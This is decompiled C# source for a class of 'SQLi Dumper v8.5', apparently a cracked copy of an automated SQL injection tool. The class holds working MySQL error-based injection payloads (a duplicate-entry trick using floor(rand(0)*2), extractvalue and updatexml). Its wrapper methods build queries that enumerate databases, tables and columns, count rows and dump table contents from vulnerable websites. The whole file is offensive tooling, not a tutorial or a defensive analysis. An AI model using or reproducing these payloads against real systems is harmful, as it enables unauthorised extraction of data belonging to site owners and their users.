// Decompiled with JetBrains decompiler
// Type: DataBase.MySQLWithError
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using System.Collections.Generic;

namespace DataBase
{
  public class MySQLWithError
  {
    private const string DUPLICATEENTRY_ERROR = "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
    private const string TYPE_EXTRACTVALUE = "extractvalue(rand(),(select [t]))";
    private const string TYPE_UPDATEXML = "updatexml(rand(),(select [t]),0)";

    private static string GetQuery(string sTraject, MySQLErrorType oType)
    {
      string str = "";
      switch (oType)
      {
        case MySQLErrorType.DuplicateEntry:
          str = sTraject.Replace("[t]", "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)");
          break;
        case MySQLErrorType.ExtractValue:
          str = sTraject.Replace("[t]", "extractvalue(rand(),(select [t]))");
          break;
        case MySQLErrorType.UpdateXML:
          str = sTraject.Replace("[t]", "updatexml(rand(),(select [t]),0)");
          break;
      }
      return str;
    }

    public static string Info(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      List<string> lColumn,
      string sEndUrl = "")
    {
      return MySQLNoError.Info(MySQLWithError.GetQuery(sTraject, oType), oCollaction, false, lColumn, sEndUrl);
    }

    public static string DataBases(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      bool bCorrentDB,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      return MySQLNoError.DataBases(MySQLWithError.GetQuery(sTraject, oType), oCollaction, false, bCorrentDB, sWhere, sOrderBy, sEndUrl, limitX, limitY);
    }

    public static string Tables(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      string sDataBase,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      return MySQLNoError.Tables(MySQLWithError.GetQuery(sTraject, oType), oCollaction, sDataBase, sWhere, sOrderBy, sEndUrl, limitX, limitY);
    }

    public static string Columns(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      string sDataBase,
      string sTable,
      bool bDataType,
      string sWhere = "",
      string sOrderBy = "",
      string sEndUrl = "",
      int limitX = 0,
      int limitY = 1)
    {
      return MySQLNoError.Columns(MySQLWithError.GetQuery(sTraject, oType), oCollaction, sDataBase, sTable, bDataType, sWhere, sOrderBy, sEndUrl, limitX, limitY);
    }

    public static string Dump(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      bool bIFNULL,
      string sDataBase,
      string sTable,
      List<string> lColumn,
      int limitX,
      int limitY = 1,
      string sEndUrl = "",
      string sWhere = "",
      string sOrderBy = "",
      string sCustomQuery = "")
    {
      return MySQLNoError.Dump(MySQLWithError.GetQuery(sTraject, oType), oCollaction, false, bIFNULL, sDataBase, sTable, lColumn, limitX, limitY, sWhere, sOrderBy, sEndUrl, sCustomQuery);
    }

    public static string Count(
      string sTraject,
      MySQLCollactions oCollaction,
      MySQLErrorType oType,
      Schema o,
      string sDataBase,
      string sTable,
      string sWhere = "",
      string sEndUrl = "")
    {
      return MySQLNoError.Count(MySQLWithError.GetQuery(sTraject, oType), oCollaction, o, sDataBase, sTable, sWhere, sEndUrl);
    }
  }
}
